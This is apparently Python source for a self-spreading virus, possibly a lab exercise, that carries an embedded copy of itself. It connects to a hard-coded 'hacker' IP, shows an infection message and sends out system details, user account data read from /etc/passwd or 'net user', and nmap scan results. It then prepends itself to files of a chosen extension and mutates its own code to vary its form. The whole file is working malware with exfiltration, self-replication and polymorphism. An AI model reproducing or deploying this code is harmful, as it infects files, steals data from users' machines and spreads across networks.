#!/usr/bin/env python3
import socket
import sys
import time
import platform
import ctypes
import subprocess
import glob
import os
import random
import re

# ----------- Variables -----------
host = '192.168.73.1' #Hacker's IP address as a string
port = 9999
target_os = None
infection_message = "You've been infected!!"
target_file_type = ".foo"
timeout = 0.01
start_port = 65435
spread_counter = 0

import subprocess

windows_services_lister_ps1 = (
    "# Define the IP address or hostname of the remote machine\n"
    '$remoteComputer = "192.168.118.1"\n'
    "\n"
    "# Get the list of services from the remote computer\n"
    '$services = Get-Service -ComputerName $remoteComputer\n'
    "\n"
    "# Print service details\n"
    '$services | ForEach-Object {\n'
    '    Write-Output "Service Name: $($_.Name)"\n'
    '    Write-Output "Display Name: $($_.DisplayName)"\n'
    '    Write-Output "Status: $($_.Status)"\n'
    '    Write-Output "---------------------------"\n'
    '}\n'
)

# Call the subprocess
process = subprocess.Popen(['powershell', '-Command', windows_services_lister_ps1],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = process.communicate()

print("Output:\n", stdout.decode())
print("Errors:\n", stderr.decode())

first_time_spread_data = r"""
#
import socket
import sys
import time
import platform
import ctypes
import subprocess
import glob
import os
import random
import re

# ----------- Variables -----------
host = '192.168.118.129' #Hacker's IP address as a string
port = 9999
target_os = None
infection_message = "You've been infected!!"
target_file_type = ".foo"
timeout = 0.01
start_port = 65435
spread_counter = 1

windows_services_lister_ps1 = (
    "# Define the IP address or hostname of the remote machine\n"
    '$remoteComputer = "192.168.118.1"\n'
    "\n"
    "# Get the list of services from the remote computer\n"
    '$services = Get-Service -ComputerName $remoteComputer\n'
    "\n"
    "# Print service details\n"
    '$services | ForEach-Object {\n'
    '    Write-Output "Service Name: $($_.Name)"\n'
    '    Write-Output "Display Name: $($_.DisplayName)"\n'
    '    Write-Output "Status: $($_.Status)"\n'
    '    Write-Output "---------------------------"\n'
    '}\n'
)

first_time_spread_data = None

# ----------- Functions ----------- 

def run_powershell_script(script):
    try:
        # Execute the PowerShell script
        print("starting script")
        result = subprocess.run(['powershell', '-Command', script], text=True, capture_output=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error executing PowerShell script: {e}")
        print(f"stderr: {e.stderr}")

# -- Infection Message -- 
#region

def post_infection_msg(target_os, infection_msg):
    print(target_os)
    msg_box_title = "WARNING: VIRUS"

    # Spawns a notification box using the default notification GUI functionalities of the OS.
    if target_os == 'Windows':
        ctypes.windll.user32.MessageBoxW(0, infection_msg, msg_box_title, 1)
    else:
        subprocess.run(['notify-send', msg_box_title, infection_msg])
#endregion

# -- Self Spread Functions --
def is_end(line):
    return True if "# END OF SCRIPT" in line and (len(line.strip()) == len("# END OF SCRIPT")) else False 

def retrieve_code():
    # Open the virus current file, the virus will be extracted from this file. 
    virus_file = open(sys.argv[0], 'r')

    # Read in the virus section using the last line comment as a marker 
    # that the virus has ended.
    virus = []
    for line in virus_file:
        virus.append(line)
        if is_end(line): 
            virus.append("\n")
            break

    virus[0] = "@echo off & python -x \"%~f0\" %* & goto :eof\n" if target_os == "Windows" else "#!/usr/bin/env python3\n"

    return virus

def spread_self(targeted_file_type, virus):

    # Go through files with target file extension.
    for item in glob.glob(str(f"*{targeted_file_type}")):

        # If the OS is windows, file needs to be renamed to batch file
        # so check if batch file with same name already exists.
        new_file_name = item    # Variable only needed for windows instances
        if target_os == "Windows": 
            basename, _ = os.path.splitext(item)
            new_file_name = basename + '.bat'

            if os.path.exists(new_file_name):
                continue

        # Read in the target file
        virus_file = open(item, 'r')
        all_lines = virus_file.readlines()
        virus_file.close()

        # If the virus has infected the current file then move onto the next file.
        if any('data_exfiltration_virus' in line for line in all_lines): 
            continue

        # Allow the current file to execute.
        os.chmod(item, 0o777)
        
        # Open the current target file for writing.
        target_file = open(item, 'w')

        # Prepend the virus into the start of the target file.
        target_file.writelines(virus)

        # Comment out the original file contents and write them back in before closing.
        all_lines = ['#' + line for line in all_lines]
        target_file.writelines(all_lines)
        target_file.close()

        # Reconfigure to a .bat (batch) script
        if target_os == "Windows":
            os.rename(item, new_file_name)
            print(f"Renamed file to {new_file_name}")

# -- Self Mutation Functions -- 
#region

def is_ignore(line):
    return True if "# IGNORE" in line else False

def is_end_ignore(line):
    return True if "# END IGNORE" in line else False

def random_sublist(substitutions):
    num_items = random.randint(1, len(substitutions))
    items = list(substitutions.items())
    return dict(random.sample(items, num_items))

def mutate_with_substitutions(code, substitutions):
    mutated_code = []
    ignore = False
    sub_list = random_sublist(substitutions)

    for line in sub_list:
        print(line)

    for line in code:
        # Skip any sections marked by ignore
        if is_ignore(line) == True or ignore == True:
            ignore = True
            if is_end_ignore(line):
                ignore = False
            mutated_code.append(line)
            continue

        # Mutate line
        for original, substitute in sub_list.items():
            line = line.replace(original, substitute)
        mutated_code.append(line)
    
    return mutated_code

def mutate_with_nop(code):
    mutated_lines = []
    found_end = False

    for line in code:
        mutated_lines.append(line)
        
        if is_end(line): break 

        if line.strip() == "pass":          # Randomly insert a "NOP"
            if random.random() < 0.05: continue
        elif random.random() < 0.05:        # If a "NOP" already exists at the line, randomly remove it.
            mutated_lines.append("pass\n")

    return mutated_lines

def swap_code(code):
    # IGNORE
    substitutions = {
        "# END OF SCRIPT": "# END OF CODE",
        "virus": "evil_stuff",
        "pass": "#pass"
    }
    # END IGNORE

    return mutate_with_substitutions(code, substitutions)

#endregion

# -- Data Exfiltration --
#region

def send_data(s, data):
    s.send(f"{data}\n".encode('utf-8'))

#endregion

def get_ip():
    command, ip_pattern = None, None
    if target_os == "Windows":
        command, ip_pattern = ['ipconfig'], re.compile(r'IPv4 Address[.\s]*: ([\d.]+)')
    else: 
        command, ip_pattern = ['ifconfig'], re.compile(r'inet\s+([\d.]+)')

    result = subprocess.run(command, capture_output=True, text=True)

    # Extract IP addresses using regex
    ip_addresses = ip_pattern.findall(result.stdout)

    for ip in ip_addresses:
        if (ip.split('.')[0] in ['192', '10']):
            return ip

def get_network_addr():
    ip = get_ip()

    if ip == None:
        return
    
    address_components = ip.split('.')
    return f"{address_components[0]}.{address_components[1]}.{address_components[2]}.0/24"

def port_scan(target, timeout):
    open_ports = []

    for port in range(start_port, 65535):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((target, port))
            print(f"Checking {port}")
            if result == 0:
                open_ports.append(port)
    return open_ports

def get_sys_info(s):
    send_data(s,"------------------- SYSTEM INFO -------------------")
    send_data(s,f"Operating System: {platform.system()}")
    send_data(s,f"OS Version: {platform.version()}")
    send_data(s,f"Platform: {platform.platform()}")
    send_data(s,f"Release: {platform.release()}")
    send_data(s,f"Machine: {platform.machine()}")
    send_data(s,f"Processor: {platform.processor()}")
    send_data(s,f"Node Name: {platform.node()}")

    if target_os == "Windows":
        try:
            send_data(s,f"Linux Distribution: {platform.linux_distribution()}")
        except AttributeError:
            send_data(s,"Linux Distribution: (Not Available)")
    
    if platform.system() == "Windows":
        send_data(s,f"Windows Version: {platform.win32_ver()}")
    
    if platform.system() == "Darwin":
        send_data(s,f"Mac Version:", {platform.mac_ver()})

def find_hosts_on_network(s):
    if target_os == "Windows":
        open_ports = port_scan(get_ip(), timeout)
        send_data(s,f"------------------- {len(open_ports)} OPEN PORTS -------------------")
        if open_ports != None and len(open_ports) > 0:
            send_data(s, str('\n'.join(open_ports)))
        return

    # If the OS is not Windows the below will run
    command = ['nmap', '-sn', get_network_addr()]

    # Run the command and capture the output
    result = subprocess.run(command, capture_output=True, text=True)
    send_data(s,"------------------- HOSTS UP IN NETWORK -------------------")
    
    data = result.stdout.splitlines()
    output = []

    for line in data:
        if line.startswith("Nmap scan report for"):
            line = line.replace("Nmap scan report for", "").strip()
            output.append(line)
    
    send_data(s, '\n'.join(output))

def windows_get_user_accounts():
    # Get the list of user accounts
    result = subprocess.run(['net', 'user'], text=True, capture_output=True, check=True)
    lines = result.stdout.splitlines()

    # Find the start and end indices for user accounts
    start_index = next(i for i, line in enumerate(lines) if 'User accounts for' in line) + 1
    end_index = next(i for i, line in enumerate(lines) if 'The command completed successfully' in line)
        
    # Extract user names
    users = []
    for line in lines[start_index:end_index]:
        # Split the line and filter out empty parts
        parts = [part.strip() for part in line.split() if part.strip()]
        if parts:
            # Use the first part as the username
            users.extend(parts)
    
    return users[1:]

def windows_get_user_details(user):
    # Get user details
    result = subprocess.run(['net', 'user', user], text=True, capture_output=True, check=True)
    details = result.stdout.splitlines()
    
    # Parse details
    user_info = {
        'User': user,
        'Full Name': '',
        'Comment': '',
        'Local Group Memberships': '',
        'Global Group Memberships': '',
        'Home Directory': 'N/A',
        'Profile Path': 'N/A'
    }
    
    return user_info

def find_running_services(s):
    if target_os == "Windows":
        send_data(s, run_powershell_script(windows_services_lister_ps1))
        return

    # This defines the nmap and its arguments
    command = ['nmap', '-sV', '-T4', '-v', get_network_addr()]

    # Run the command and capture the output
    result = subprocess.run(command, capture_output=True, text=True)

    send_data(s,"------------------- SERVICES AND OPEN PORTS PERTAINING TO EACH HOST ON THE NETWORK -------------------")

    # Regular expressions to capture host information
    host_pattern = r'Nmap scan report for ([\w.-]+) \(([\d.]+)\)'

    # Find all hosts
    hosts = re.findall(host_pattern, result.stdout)

    # Split the nmap output by hosts
    host_sections = re.split(r'Nmap scan report for ', result.stdout)[1:]

    output = []
    for line in host_sections:
        if "[host down]" not in line:
            output.append(line)

    output.pop()
    send_data(s, ''.join(output))


def get_user_info(s):
    # Get the list of user accounts with UID >= 1000
    if target_os == "Windows":
        users = windows_get_user_accounts()

        send_data(s, "------------------- User Info -------------------")
        for user in users:
            user_info = windows_get_user_details(user)
            if user_info:
                send_data(s, f"User: {user_info['User']}")
                send_data(s, f"Full Name: {user_info['Full Name']}")
                send_data(s, f"Comment: {user_info['Comment']}")
                send_data(s, f"Local Group Memberships: {user_info['Local Group Memberships']}")
                send_data(s, f"Global Group Memberships: {user_info['Global Group Memberships']}")
                send_data(s, f"Home Directory: {user_info['Home Directory']}")
                send_data(s, f"Profile Path: {user_info['Profile Path']}\n")
        return
    
    # Runs if the os is Linux
    try:
        result = subprocess.run(['awk', '-F:', '$3 >= 1000 { print $1 }', '/etc/passwd'],
                                text=True, capture_output=True, check=True)
        users = result.stdout.splitlines()
    except subprocess.CalledProcessError as e:
        print(f"Error fetching users: {e}")
        return

    send_data(s,"------------------- User Info -------------------")
    for user in users:
        # Get user details
        user_info = subprocess.run(['getent', 'passwd', user], text=True, capture_output=True, check=True)
        user_details = user_info.stdout.strip().split(':')
        uid, gid, full_name, home_dir, shell = user_details[2], user_details[3], user_details[4], user_details[5], user_details[6]

        # Print user information
        send_data(s,f"User: {user}")
        send_data(s,f"UID: {uid}")
        send_data(s,f"GID: {gid}")
        send_data(s,f"Full Name: {full_name}")
        send_data(s,f"Home Directory: {home_dir}")
        send_data(s,f"Shell: {shell}\n")

# ----------- Main Operations ----------- 

# (1) Retrieve host OS information.
target_os = platform.system()

# (2) Establish connection with commander.
s = socket.socket()
s.connect((host, port))

send_data(s, f"Target OS: '{str(target_os)}'")

# (3) Send infection message.
post_infection_msg(target_os, infection_message)

# (4) Data Exfiltration

    # (4.1) Get system information - OS, Version, Distribution, etc.
get_sys_info(s)

    # (4.2) Get information about the user accounts including username...
get_user_info(s)

# (4.3) Find the active hosts on the network.
# if target_os != "Windows":
# find_hosts_on_network(s)
# (4.4) See what services are running & whats ports are open.
# find_running_services(s)

# (5) Self Mutations

virus = retrieve_code()
# virus = mutate_with_nop(virus)
virus = swap_code(virus)


# (6) Perform Self Spread
spread_self(target_file_type, ''.join(virus))
sys.exit(1)

# END OF SCRIPT
"""

# ----------- Functions ----------- 

def run_powershell_script(script):
    try:
        # Execute the PowerShell script
        print("starting script")
        result = subprocess.run(['powershell', '-Command', script], text=True, capture_output=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error executing PowerShell script: {e}")
        print(f"stderr: {e.stderr}")

# -- Infection Message -- 
#region

def post_infection_msg(target_os, infection_msg):
    print(target_os)
    msg_box_title = "WARNING: VIRUS"

    # Spawns a notification box using the default notification GUI functionalities of the OS.
    if target_os == 'Windows':
        ctypes.windll.user32.MessageBoxW(0, infection_msg, msg_box_title, 1)
    else:
        subprocess.run(['notify-send', msg_box_title, infection_msg])
#endregion

# -- Self Spread Functions --
def is_end(line):
    return True if "# END OF SCRIPT" in line and (len(line.strip()) == len("# END OF SCRIPT")) else False 

def retrieve_code():
    # Open the virus current file, the virus will be extracted from this file. 
    virus_file = open(sys.argv[0], 'r')

    # Read in the virus section using the last line comment as a marker 
    # that the virus has ended.
    virus = []
    for line in virus_file:
        virus.append(line)
        if is_end(line): 
            virus.append("\n")
            break

    virus[0] = "@echo off & python -x \"%~f0\" %* & goto :eof\n" if target_os == "Windows" else "#!/usr/bin/env python3\n"

    return virus

def spread_self(targeted_file_type, virus):

    # Go through files with target file extension.
    for item in glob.glob(str(f"*{targeted_file_type}")):

        # If the OS is windows, file needs to be renamed to batch file
        # so check if batch file with same name already exists.
        new_file_name = item    # Variable only needed for windows instances
        if target_os == "Windows": 
            basename, _ = os.path.splitext(item)
            new_file_name = basename + '.bat'

            if os.path.exists(new_file_name):
                continue

        # Read in the target file
        virus_file = open(item, 'r')
        all_lines = virus_file.readlines()
        virus_file.close()

        # If the virus has infected the current file then move onto the next file.
        if any('data_exfiltration_virus' in line for line in all_lines): 
            continue

        # Allow the current file to execute.
        os.chmod(item, 0o777)
        
        # Open the current target file for writing.
        target_file = open(item, 'w')

        # Prepend the virus into the start of the target file.
        target_file.writelines(virus)

        # Comment out the original file contents and write them back in before closing.
        all_lines = ['#' + line for line in all_lines]
        target_file.writelines(all_lines)
        target_file.close()

        # Reconfigure to a .bat (batch) script
        if target_os == "Windows":
            os.rename(item, new_file_name)
            print(f"Renamed file to {new_file_name}")

# -- Self Mutation Functions -- 
#region

def is_ignore(line):
    return True if "# IGNORE" in line else False

def is_end_ignore(line):
    return True if "# END IGNORE" in line else False

def random_sublist(substitutions):
    num_items = random.randint(1, len(substitutions))
    items = list(substitutions.items())
    return dict(random.sample(items, num_items))

"""
function: mutate_with_substitutions

Replaces elements of the original code with potential substitutions. 


"""
def mutate_with_substitutions(code, substitutions):
    mutated_code = []
    ignore = False
    sub_list = random_sublist(substitutions)

    for line in sub_list:
        print(line)

    for line in code:
        # Skip any sections marked by ignore
        if is_ignore(line) == True or ignore == True:
            ignore = True
            if is_end_ignore(line):
                ignore = False
            mutated_code.append(line)
            continue

        # Mutate line
        for original, substitute in sub_list.items():
            line = line.replace(original, substitute)
        mutated_code.append(line)
    
    return mutated_code

""" 
function: mutate_with_nop

Insert a "no-operation" equivalent statement in code. This is done using 
commands such as pass or unnecessary variable assignments. 
"""
def mutate_with_nop(code):
    mutated_lines = []
    found_end = False

    for line in code:
        mutated_lines.append(line)
        
        if is_end(line): break 

        if line.strip() == "pass":          # Randomly insert a "NOP"
            if random.random() < 0.05: continue
        elif random.random() < 0.05:        # If a "NOP" already exists at the line, randomly remove it.
            mutated_lines.append("pass\n")

    return mutated_lines

"""
function: swap_code

Swaps code according to the substitutions, this means that operators and variables can be
swapped. 

This simulates register swapping in assembly for python by swapping around the names
of variables. 
"""
def swap_code(code):
    # IGNORE
    substitutions = {
        "# END OF SCRIPT": "# END OF CODE",
        "virus": "evil_stuff",
        "pass": "#pass"
    }
    # END IGNORE

    return mutate_with_substitutions(code, substitutions)

#endregion

# -- Data Exfiltration --
#region

"""
function: send_data

A wrapper for socket.send() which encodes automatically in utf-8.
"""
def send_data(s, data):
    s.send(f"{data}\n".encode('utf-8'))

#endregion

def get_ip():
    command, ip_pattern = None, None
    if target_os == "Windows":
        command, ip_pattern = ['ipconfig'], re.compile(r'IPv4 Address[.\s]*: ([\d.]+)')
    else: 
        command, ip_pattern = ['ifconfig'], re.compile(r'inet\s+([\d.]+)')

    result = subprocess.run(command, capture_output=True, text=True)

    # Extract IP addresses using regex
    ip_addresses = ip_pattern.findall(result.stdout)

    for ip in ip_addresses:
        if (ip.split('.')[0] in ['192', '10']):
            return ip

def get_network_addr():
    ip = get_ip()

    if ip == None:
        return
    
    address_components = ip.split('.')
    return f"{address_components[0]}.{address_components[1]}.{address_components[2]}.0/24"

def port_scan(target, timeout):
    open_ports = []

    for port in range(start_port, 65535):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((target, port))
            print(f"Checking {port}")
            if result == 0:
                open_ports.append(port)
    return open_ports

def get_sys_info(s):
    send_data(s,"------------------- SYSTEM INFO -------------------")
    send_data(s,f"Operating System: {platform.system()}")
    send_data(s,f"OS Version: {platform.version()}")
    send_data(s,f"Platform: {platform.platform()}")
    send_data(s,f"Release: {platform.release()}")
    send_data(s,f"Machine: {platform.machine()}")
    send_data(s,f"Processor: {platform.processor()}")
    send_data(s,f"Node Name: {platform.node()}")

    if target_os == "Windows":
        try:
            send_data(s,f"Linux Distribution: {platform.linux_distribution()}")
        except AttributeError:
            send_data(s,"Linux Distribution: (Not Available)")
    
    if platform.system() == "Windows":
        send_data(s,f"Windows Version: {platform.win32_ver()}")
    
    if platform.system() == "Darwin":
        send_data(s,f"Mac Version:", {platform.mac_ver()})

def find_hosts_on_network(s):
    if target_os == "Windows":
        open_ports = port_scan(get_ip(), timeout)
        send_data(s,f"------------------- {len(open_ports)} OPEN PORTS -------------------")
        if open_ports != None and len(open_ports) > 0:
            send_data(s, str('\n'.join(open_ports)))
        return

    # If the OS is not Windows the below will run
    command = ['nmap', '-sn', get_network_addr()]

    # Run the command and capture the output
    result = subprocess.run(command, capture_output=True, text=True)
    send_data(s,"------------------- HOSTS UP IN NETWORK -------------------")
    
    data = result.stdout.splitlines()
    output = []

    for line in data:
        if line.startswith("Nmap scan report for"):
            line = line.replace("Nmap scan report for", "").strip()
            output.append(line)
    
    send_data(s, '\n'.join(output))

def windows_get_user_accounts():
    # Get the list of user accounts
    result = subprocess.run(['net', 'user'], text=True, capture_output=True, check=True)
    lines = result.stdout.splitlines()

    # Find the start and end indices for user accounts
    start_index = next(i for i, line in enumerate(lines) if 'User accounts for' in line) + 1
    end_index = next(i for i, line in enumerate(lines) if 'The command completed successfully' in line)
        
    # Extract user names
    users = []
    for line in lines[start_index:end_index]:
        # Split the line and filter out empty parts
        parts = [part.strip() for part in line.split() if part.strip()]
        if parts:
            # Use the first part as the username
            users.extend(parts)
    
    return users[1:]

def windows_get_user_details(user):
    # Get user details
    result = subprocess.run(['net', 'user', user], text=True, capture_output=True, check=True)
    details = result.stdout.splitlines()
    
    # Parse details
    user_info = {
        'User': user,
        'Full Name': '',
        'Comment': '',
        'Local Group Memberships': '',
        'Global Group Memberships': '',
        'Home Directory': 'N/A',
        'Profile Path': 'N/A'
    }
    
    return user_info

def find_running_services(s):
    if target_os == "Windows":
        send_data(s, run_powershell_script(windows_services_lister_ps1))
        return

    # This defines the nmap and its arguments
    command = ['nmap', '-sV', '-T4', '-v', get_network_addr()]

    # Run the command and capture the output
    result = subprocess.run(command, capture_output=True, text=True)

    send_data(s,"------------------- SERVICES AND OPEN PORTS PERTAINING TO EACH HOST ON THE NETWORK -------------------")

    # Regular expressions to capture host information
    host_pattern = r'Nmap scan report for ([\w.-]+) \(([\d.]+)\)'

    # Find all hosts
    hosts = re.findall(host_pattern, result.stdout)

    # Split the nmap output by hosts
    host_sections = re.split(r'Nmap scan report for ', result.stdout)[1:]

    output = []
    for line in host_sections:
        if "[host down]" not in line:
            output.append(line)

    output.pop()
    send_data(s, ''.join(output))


def get_user_info(s):
    # Get the list of user accounts with UID >= 1000
    if target_os == "Windows":
        users = windows_get_user_accounts()

        send_data(s, "------------------- User Info -------------------")
        for user in users:
            user_info = windows_get_user_details(user)
            if user_info:
                send_data(s, f"User: {user_info['User']}")
                send_data(s, f"Full Name: {user_info['Full Name']}")
                send_data(s, f"Comment: {user_info['Comment']}")
                send_data(s, f"Local Group Memberships: {user_info['Local Group Memberships']}")
                send_data(s, f"Global Group Memberships: {user_info['Global Group Memberships']}")
                send_data(s, f"Home Directory: {user_info['Home Directory']}")
                send_data(s, f"Profile Path: {user_info['Profile Path']}\n")
        return
    
    # Runs if the os is Linux
    try:
        result = subprocess.run(['awk', '-F:', '$3 >= 1000 { print $1 }', '/etc/passwd'],
                                text=True, capture_output=True, check=True)
        users = result.stdout.splitlines()
    except subprocess.CalledProcessError as e:
        print(f"Error fetching users: {e}")
        return

    send_data(s,"------------------- User Info -------------------")
    for user in users:
        # Get user details
        user_info = subprocess.run(['getent', 'passwd', user], text=True, capture_output=True, check=True)
        user_details = user_info.stdout.strip().split(':')
        uid, gid, full_name, home_dir, shell = user_details[2], user_details[3], user_details[4], user_details[5], user_details[6]

        # Print user information
        send_data(s,f"User: {user}")
        send_data(s,f"UID: {uid}")
        send_data(s,f"GID: {gid}")
        send_data(s,f"Full Name: {full_name}")
        send_data(s,f"Home Directory: {home_dir}")
        send_data(s,f"Shell: {shell}\n")

# ----------- Main Operations ----------- 

# (1) Retrieve host OS information.
target_os = platform.system()

# (2) Establish connection with commander.
s = socket.socket()
s.connect((host, port))

send_data(s, f"Target OS: '{str(target_os)}'")

# (3) Send infection message.
post_infection_msg(target_os, infection_message)

# (4) Data Exfiltration

    # (4.1) Get system information - OS, Version, Distribution, etc.
get_sys_info(s)

    # (4.2) Get information about the user accounts including username...
get_user_info(s)

# (4.3) Find the active hosts on the network.
# if target_os != "Windows":
# find_hosts_on_network(s)
# (4.4) See what services are running & whats ports are open.
find_running_services(s)

# (5) Self Mutations && (6) Perform Self Spread
if spread_counter > 0:
    virus = retrieve_code()
    virus = mutate_with_nop(virus)
    virus = swap_code(virus)
    spread_counter += 1
    spread_self(target_file_type, ''.join(virus))
else:
    spread_self(target_file_type, ''.join(first_time_spread_data))



sys.exit(1)

# END OF SCRIPT